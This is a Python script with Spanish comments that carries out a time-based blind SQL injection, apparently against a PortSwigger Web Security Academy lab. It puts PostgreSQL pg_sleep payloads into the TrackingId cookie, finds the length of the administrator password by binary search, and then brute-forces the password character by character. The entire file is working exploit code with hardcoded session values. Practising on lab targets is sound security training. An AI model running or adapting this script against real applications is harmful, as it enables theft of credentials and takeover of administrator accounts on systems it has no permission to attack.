from pwn import *
import requests, signal, time, sys, string;
from string import *
import math;
def def_handler(sig, frame): #cierra la consola ctrl + c
    print('saliendo',sig);
    sys.exit(1);

signal.signal(signal.SIGINT,def_handler);

#variables globales
characters = string.ascii_lowercase + string.digits
main_url = 'https://0a4900d8032ba9ce805b129300c400e1.web-security-academy.net/';
cookieini = "MGX7fx7QGNW6Kugv";
session = "7Fb9pFuNLpq7Pn0mthfjqQZyPUQoGg0X";
cookies = {
    'TrackingId': "",
    'session': session
}
#encuentra la contraseña usando la fuerza bruta
def makeRq():
    #variables
    l = int(sizefind(100)+1);
    password = ""

    ps = log.progress('codigo ejecutado');
    ps.status("iniciando ataque");

    #time.sleep(2);
    p2= log.progress('password')
    
    #hace un recorrido de 1 a el tamaño de la contraseña
    for position in range(1,l):
        for character in characters:
            cookies['TrackingId'] = "%s'||(select case when substr(password,%d,1)='%s' then pg_sleep(1.5) else pg_sleep(0) end from users where username='administrator')||'" % (cookieini,position,character)
            ps.status(cookies['TrackingId']);
            timeStart = time.time()
            r = requests.get(main_url,cookies=cookies);
            timeEnd = time.time() - timeStart;
            #compara los valores de los caracteres en la contraseña
            if timeEnd > 1.5:
                password += character;
                p2.status(password);
                break
#encuentra el tamaño de la contraseña
def sizefind(max):
    dive = max/2;
    valueSearcher= max/2;
    pb = log.progress('codigo ejecutado')
    pb.status('iniciando');
    #time.sleep(2)
    p2 = log.progress('encontrando tamaño')
    while(True):
        dive = math.ceil(dive/2);
        if(compareEqual(valueSearcher)):
                pb.success('end tracking Id [x]')
                p2.success('end program   [x]')
                return valueSearcher;
        if(compareMinor(valueSearcher)):
            valueSearcher += dive;
        else:
            valueSearcher -= dive;
        pb.status(cookies['TrackingId'])
        p2.status(valueSearcher)
        
        #time.sleep(1)

#compara si el valor es menor que el tamaño de la contraseña en la base de datos
def compareMinor(value):
    cookies['TrackingId'] = "%s'||(select case when 1=1 then pg_sleep(5) else pg_sleep(0) end from users where username='administrator' and length(password)>%d)||'" % (cookieini,value)
    timeStart = time.time()
    r = requests.get(main_url,cookies=cookies)
    timeEnd = time.time() - timeStart;
    return timeEnd > 1.5;
#compara si el valor es igual al tamaño de la contraseña en la base de datos
def compareEqual(value):
    cookies['TrackingId'] = "%s'||(select case when 1=1 then pg_sleep(5) else pg_sleep(0) end from users where username='administrator' and length(password)=%d)||'" % (cookieini,value)
    timeStart = time.time()
    r = requests.get(main_url,cookies=cookies)
    timeEnd = time.time() - timeStart;
    return timeEnd > 1.5;

if __name__ == '__main__':
    makeRq();